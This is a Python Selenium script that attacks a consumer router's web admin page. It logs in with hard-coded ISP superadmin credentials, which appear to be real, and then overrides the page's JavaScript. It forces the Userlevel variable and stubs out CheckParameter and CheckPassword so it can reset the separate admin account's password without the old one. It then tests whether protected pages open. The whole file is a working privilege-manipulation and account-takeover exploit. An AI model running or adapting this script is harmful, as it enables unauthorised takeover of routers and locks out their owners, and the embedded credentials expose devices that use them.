#!/usr/bin/env python3
"""
Use the REAL admin.html form to change admin password.
Force Userlevel=1 so SubmitUpdate targets MdfPwdNormalNoLg.cgi (admin account).
The form submission carries the correct cookies (unlike AJAX).
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver


def main():
    NEW_PWD = "Admin9999"
    driver = setup_driver()

    try:
        # Step 1: Login as superadmin
        print("Step 1: Login as superadmin on admin.html...")
        driver.get(f"{ROUTER}/admin.html")
        time.sleep(4)

        user = driver.find_element(By.ID, "txt_Username")
        pw = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value='';", user)
        driver.execute_script("arguments[0].value='';", pw)
        user.send_keys("adminpldt")
        pw.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
        driver.execute_script("window.setDisable = function() {}; document.getElementById('button').style.display = '';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)

        level = driver.execute_script("return window.Userlevel;")
        print(f"Userlevel: {level}")
        if level != 2:
            print("Not superadmin!")
            return

        # Step 2: Fill the password form and force Userlevel=1
        print(f"\nStep 2: Setting up admin password change to '{NEW_PWD}'...")

        # Fill in the form fields
        driver.execute_script("document.getElementById('old_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")
        driver.execute_script(f"document.getElementById('new_password').value = '{NEW_PWD}';")
        driver.execute_script(f"document.getElementById('confirm_password').value = '{NEW_PWD}';")

        # Force Userlevel to 1 BEFORE clicking Update
        # This makes SubmitUpdate target MdfPwdNormalNoLg.cgi (admin account)
        driver.execute_script("window.Userlevel = 1;")

        # Override CheckParameter to skip old password check
        driver.execute_script("window.CheckParameter = function() { return true; };")

        # Verify the state
        level2 = driver.execute_script("return window.Userlevel;")
        old_pwd_val = driver.execute_script("return document.getElementById('old_password').value;")
        new_pwd_val = driver.execute_script("return document.getElementById('new_password').value;")
        print(f"  Userlevel now: {level2}")
        print(f"  old_password: {old_pwd_val}")
        print(f"  new_password: {new_pwd_val}")

        # Step 3: Click the Update button (triggers real form submit)
        print("\nStep 3: Clicking Update button (real form submit)...")

        # The button triggers SubmitUpdate() which creates a hidden form and submits it
        driver.find_element(By.ID, "button_update").click()
        time.sleep(6)

        # Check where we ended up
        url = driver.current_url
        src = driver.page_source
        print(f"After update URL: {url}")
        print(f"Page size: {len(src)} chars")
        print(f"Page text: {driver.execute_script('return document.body ? document.body.innerText.substring(0, 500) : \"\";')}")

        # Check cookies
        cookies = driver.get_cookies()
        print(f"Cookies: {cookies}")

        # Save the response page
        with open("update_result.html", "w", encoding="utf-8") as f:
            f.write(src)

        # Step 4: Verify if admin password changed
        print(f"\nStep 4: Verifying admin:{NEW_PWD}...")
        driver.get(f"{ROUTER}/login.asp")
        time.sleep(3)

        # Check for lockout first
        lockout = driver.execute_script("return window.LockLeftTime;")
        print(f"LockLeftTime: {lockout}")

        # Try the new password
        try:
            u = driver.find_element(By.ID, "txt_Username")
            p = driver.find_element(By.ID, "txt_Password")
            driver.execute_script("arguments[0].value='';", u)
            driver.execute_script("arguments[0].value='';", p)
            u.send_keys("admin")
            p.send_keys(NEW_PWD)
            driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
            driver.execute_script("document.getElementById('button').style.display='';")
            driver.find_element(By.ID, "button").click()
            time.sleep(4)

            url2 = driver.current_url
            has_login = "txt_Username" in driver.page_source
            print(f"admin:{NEW_PWD} -> URL: {url2}, login form: {has_login}")

            if not has_login:
                # Try to access a protected page
                driver.get(f"{ROUTER}/html/amp/wlanbasic/WlanBasic.asp?2G")
                time.sleep(3)
                protected_accessible = "txt_Username" not in driver.page_source
                print(f"Protected page accessible: {protected_accessible}")
                if protected_accessible:
                    print(f"\n*** ADMIN PASSWORD CHANGED SUCCESSFULLY! ***")
                    print(f"*** admin:{NEW_PWD} ***")
        except Exception as e:
            print(f"Error verifying: {e}")

    finally:
        driver.quit()


if __name__ == "__main__":
    main()
